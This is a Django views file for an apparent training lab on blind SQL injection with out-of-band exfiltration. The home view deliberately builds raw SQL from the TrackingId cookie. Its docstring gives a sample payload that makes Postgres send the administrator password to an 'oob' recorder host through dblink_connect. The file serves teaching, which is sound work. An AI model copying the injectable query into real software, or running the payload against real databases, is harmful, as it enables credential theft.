"""
Views for the "Blind SQLi with out-of-band data exfiltration" lab.

Three surfaces:

1. `home` is the vulnerable entry point. The `TrackingId` cookie is
   concatenated directly into a raw SQL query against `tracked_users`.
   The query result is never reflected, any database exception is
   swallowed, and there is no timing gate - so the response body is
   byte-identical whether or not the payload did anything interesting.

   The intended exploitation path is to make the database itself
   initiate an outbound libpq connection to the oob recorder with
   the administrator password embedded in one of the connection-
   string parameters. The oob recorder parses the Postgres startup
   message and exposes those parameters over its HTTP log, which
   this view polls and renders on the page. Example payload:

       TrackingId=x'||(SELECT dblink_connect('host=oob port=5432
           sslmode=disable user=' ||
           (SELECT password FROM users WHERE username='administrator')
           || ' password=x dbname=x'))||'

2. `login_view` is parameterized and safe. The learner has to
   recover the administrator password from the oob log and log in
   with it through the normal form.

3. `my_account` reveals the flag when the authenticated user is
   flagged as `is_admin`.
"""

import json
import urllib.error
import urllib.request

from django.conf import settings
from django.db import connection
from django.http import HttpRequest, HttpResponse
from django.shortcuts import redirect, render
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_http_methods

from .models import Flag, User


SEEDED_TRACKING_ID = "psw-lab-visitor-001"


def _current_user(request: HttpRequest) -> User | None:
    user_id = request.session.get("user_id")
    if not user_id:
        return None
    return User.objects.filter(pk=user_id).first()


def _oob_entries() -> list[dict]:
    try:
        with urllib.request.urlopen(settings.OOB_LOG_URL, timeout=2.0) as resp:
            payload = json.loads(resp.read().decode())
            return payload.get("entries", [])
    except (urllib.error.URLError, TimeoutError, json.JSONDecodeError, OSError):
        return []


def home(request: HttpRequest) -> HttpResponse:
    tracking_id = request.COOKIES.get("TrackingId")

    # Vulnerable lookup. Cookie goes straight into SQL. Result unused;
    # exceptions swallowed. The response body below is identical in
    # every case - there is no in-band signal whatsoever.
    if tracking_id is not None:
        query = (
            "SELECT tracking_id FROM tracked_users "
            "WHERE tracking_id = '" + tracking_id + "'"
        )
        try:
            with connection.cursor() as cursor:
                cursor.execute(query)
                cursor.fetchall()
        except Exception:
            pass

    entries = _oob_entries()

    response = render(
        request,
        "shop/home.html",
        {
            "current_user": _current_user(request),
            "oob_hostname": settings.OOB_HOSTNAME,
            "oob_entries": entries,
            "oob_entry_count": len(entries),
        },
    )

    if tracking_id is None:
        response.set_cookie(
            "TrackingId",
            SEEDED_TRACKING_ID,
            max_age=60 * 60 * 24 * 365,
            httponly=False,
            samesite="Lax",
        )

    return response


@csrf_exempt
@require_http_methods(["GET", "POST"])
def login_view(request: HttpRequest) -> HttpResponse:
    if request.method == "GET":
        return render(request, "shop/login.html", {})

    username = request.POST.get("username", "")
    password = request.POST.get("password", "")

    # Safe parameterized lookup - only real credentials get through.
    user = User.objects.filter(username=username, password=password).first()
    if user is None:
        return render(
            request,
            "shop/login.html",
            {"error": "Invalid username or password."},
        )

    request.session["user_id"] = user.id
    return redirect("my_account")


def logout_view(request: HttpRequest) -> HttpResponse:
    request.session.flush()
    return redirect("home")


def my_account(request: HttpRequest) -> HttpResponse:
    user = _current_user(request)
    if user is None:
        return redirect("login")

    flag = None
    if user.is_admin:
        flag_row = Flag.objects.first()
        if flag_row is not None:
            flag = flag_row.content

    return render(
        request,
        "shop/my_account.html",
        {"user": user, "solved": flag is not None, "flag": flag},
    )
